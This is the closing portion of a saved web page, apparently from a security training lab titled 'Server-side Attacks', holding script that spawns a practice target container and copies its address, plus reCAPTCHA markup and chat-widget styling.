+    $('.target, .targetIp').click(e => {
+        if ($('.resetTargetBtn').is(':hidden')) return;
+        navigator.clipboard.writeText($(e.target).html())
+            .then(() => {
+                toastr['success']('Target copied to clipboard', 'Success');
+            })
+            .catch(err => {
+                console.log('Something went wrong while copying to clipboard.', err);
+            });
+    });
+
+        $('.spawnTargetBtn').click(function() {
+        spawnDocker();
+    })
+
+    function spawnDocker() {
+        $('.target').html('<i class="fad fa-circle-notch fa-spin"></i> Target is spawning...');
+        axios.get('/api/spawn/container/1343').then(response => {
+            let data = response.data;
+            if (data.success === 1) {
+                $('.target').html(data.instance.hostname+":"+data.instance.port);
+                $('.targetIp').html(data.instance.hostname);
+                $('.resetTargetBtn').show();
+                $('.resetTargetBtn').prop('disabled',false);
+                $('.targetLifeTimeContainer').show();
+                $('.targetLifeTime').html(90);
+                startTargetCountdown();
+            } else {
+                toastr["error"]("Target failed to spawn. Please try refreshing the page.", "Error");
+                $('.target').html('<i class="fad fa-circle-notch fa-spin"></i> Target failed to spawn :(');
+                $('.resetTargetBtn').prop('disabled',false);
+            }
+        });
+    }
+        
+    function startTargetCountdown() {
+        targetCountdown = setInterval(function() {
+            let life = parseInt($('.targetLifeTime').html()) -1;
+            $('.targetLifeTime').html(life)
+            if (life == 0) {
+                $('.targetLifeTimeContainer').hide();
+            }
+        }, 60 * 1000);
+    }
+</script>
+
+
+<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" src="./Server-side Attacks16_files/anchor.html" width="256" height="60" role="presentation" name="a-bha3w1a4smtk" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="./Server-side Attacks16_files/saved_resource.html"></iframe></div><div id="torrent-scanner-popup" style="display: none;"></div><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" src="./Server-side Attacks16_files/saved_resource(1).html"></iframe><div class="intercom-lightweight-app"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 32"><path d="M28 32s-4.714-1.855-8.527-3.34H3.437C1.54 28.66 0 27.026 0 25.013V3.644C0 1.633 1.54 0 3.437 0h21.125c1.898 0 3.437 1.632 3.437 3.645v18.404H28V32zm-4.139-11.982a.88.88 0 00-1.292-.105c-.03.026-3.015 2.681-8.57 2.681-5.486 0-8.517-2.636-8.571-2.684a.88.88 0 00-1.29.107 1.01 1.01 0 00-.219.708.992.992 0 00.318.664c.142.128 3.537 3.15 9.762 3.15 6.226 0 9.621-3.022 9.763-3.15a.992.992 0 00.317-.664 1.01 1.01 0 00-.218-.707z"></path></svg></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg viewBox="0 0 16 14" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M.116 4.884l1.768-1.768L8 9.232l6.116-6.116 1.768 1.768L8 12.768.116 4.884z"></path></svg></div></div><style id="intercom-lightweight-app-style" type="text/css">
+  @keyframes intercom-lightweight-app-launcher {
+    from {
+      opacity: 0;
+      transform: scale(0.5);
+    }
+    to {
+      opacity: 1;
+      transform: scale(1);
+    }
+  }
+
+  @keyframes intercom-lightweight-app-gradient {
+    from {
+      opacity: 0;
+    }
+    to {
+      opacity: 1;
+    }
+  }
+
+  @keyframes intercom-lightweight-app-messenger {
+    from {
+      opacity: 0;
+      transform: translateY(20px);
+    }
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  .intercom-lightweight-app {
+    position: fixed;
+    z-index: 2147483001;
+    width: 0;
+    height: 0;
+    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
+  }
+
+  .intercom-lightweight-app-gradient {
+    position: fixed;
+    z-index: 2147483002;
+    width: 500px;
+    height: 500px;
+    bottom: 0;
+    right: 0;
+    pointer-events: none;
+    background: radial-gradient(
+      ellipse at bottom right,
+      rgba(29, 39, 54, 0.16) 0%,
+      rgba(29, 39, 54, 0) 72%);
+    animation: intercom-lightweight-app-gradient 200ms ease-out;
+  }
+
+  .intercom-lightweight-app-launcher {
+    position: fixed;
+    z-index: 2147483003;
+    bottom: 20px;
+    right: 20px;
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    background: #85C700;
+    cursor: pointer;
+    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
+    animation: intercom-lightweight-app-launcher 250ms ease;
+  }
+
+  .intercom-lightweight-app-launcher:focus {
+    outline: none;
+    
+  }
+
+  .intercom-lightweight-app-launcher-icon {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 60px;
+    height: 60px;
+    transition: transform 100ms linear, opacity 80ms linear;
+  }
+
+  .intercom-lightweight-app-launcher-icon-open {
+    
+        opacity: 1;
+        transform: rotate(0deg) scale(1);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-open svg {
+    width: 28px;
+    height: 32px;
+  }
+
+  .intercom-lightweight-app-launcher-icon-open svg path {
+    fill: rgb(255, 255, 255);
+  }
+
+  .intercom-lightweight-app-launcher-icon-self-serve {
+    
+        opacity: 1;
+        transform: rotate(0deg) scale(1);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-self-serve svg {
+    height: 56px;
+  }
+
+  .intercom-lightweight-app-launcher-icon-self-serve svg path {
+    fill: rgb(255, 255, 255);
+  }
+
+  .intercom-lightweight-app-launcher-custom-icon-open {
+    max-height: 36px;
+    max-width: 36px;
+    
+        opacity: 1;
+        transform: rotate(0deg) scale(1);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-minimize {
+    
+        opacity: 0;
+        transform: rotate(-60deg) scale(0);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-minimize svg {
+    width: 16px;
+  }
+
+  .intercom-lightweight-app-launcher-icon-minimize svg path {
+    fill: rgb(255, 255, 255);
+  }
+
+  .intercom-lightweight-app-messenger {
+    position: fixed;
+    z-index: 2147483003;
+    overflow: hidden;
+    background-color: white;
+    animation: intercom-lightweight-app-messenger 250ms ease-out;
+    
+        width: 376px;
+        height: calc(100% - 120px);
+        max-height: 704px;
+        min-height: 250px;
+        right: 20px;
+        bottom: 100px;
+        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
+        border-radius: 8px;
+      
+  }
+
+  .intercom-lightweight-app-messenger-header {
+    height: 75px;
+    background: linear-gradient(
+      135deg,
+      rgb(17, 25, 39) 0%,
+      rgb(0, 0, 0) 100%
+    );
+  }
+
+  @media print {
+    .intercom-lightweight-app {
+      display: none;
+    }
+  }
+</style></div><img src="./Server-side Attacks16_files/adsct" height="1" width="1" style="display: none;"><img src="./Server-side Attacks16_files/adsct(1)" height="1" width="1" style="display: none;"></body></html>
